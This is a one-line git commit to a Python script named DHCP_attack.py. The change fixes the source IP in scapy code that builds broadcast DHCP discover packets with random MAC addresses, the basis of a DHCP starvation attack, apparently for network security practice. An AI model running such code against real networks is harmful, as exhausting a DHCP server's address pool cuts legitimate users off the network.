7889c593a785d6f610885bcc5ed64a47056f07b5
anilceylan <117746131+anilceylan@users.noreply.github.com>
2023-10-09 21:23:26 +0300

    Update DHCP_attack.py

--- Python/DHCP_attack.py
+++ Python/DHCP_attack.py
@@ -3,7 +3,7 @@ from scapy.all import *
 conf.checkIPaddr = False
 
 ether_packet = Ether(dst='ff:ff:ff:ff:ff:ff')
-ip_packet = IP(src="0.0.0.", dst="255.255.255.255")
+ip_packet = IP(src="0.0.0.0", dst="255.255.255.255")
 udp = UDP(sport=68, dport = 67)
 bootp = BOOTP(op=1, chaddr=RandMAC())
 dhcp = DHCP(options=[("message-type","discover"),"end"])
